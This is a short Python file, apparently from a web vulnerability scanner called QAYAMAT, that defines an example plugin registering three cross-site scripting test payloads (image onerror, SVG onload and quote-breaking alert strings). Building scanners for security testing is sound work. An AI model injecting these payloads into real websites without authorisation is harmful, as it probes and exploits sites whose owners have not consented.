"""QAYAMAT — Example: Custom Payload Plugin"""

from plugins.base_plugin import BasePlugin
from typing import Any, Dict, List


class CustomPayloadPlugin(BasePlugin):
    name = "custom_payload"
    version = "1.0"
    description = "Example custom payload generator — add your own payloads here"
    author = "Pr0fessor_SnApe"

    CUSTOM_XSS = [
        "<img src=x onerror=alert('QAYAMAT')>",
        "<svg/onload=alert('QAYAMAT')>",
        "';alert('QAYAMAT')//",
    ]

    def run(self, context: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        This plugin doesn't produce findings directly —
        it augments the payload engine with custom payloads.
        Return them as info findings for visibility.
        """
        return [
            {
                "title": f"Custom XSS Payload Loaded: {p[:40]}",
                "severity": "Info",
                "url": "N/A",
                "vuln_type": "Custom Payload",
                "description": f"Custom payload registered: {p}",
            }
            for p in self.CUSTOM_XSS
        ]

    def get_payloads(self) -> List[str]:
        return self.CUSTOM_XSS
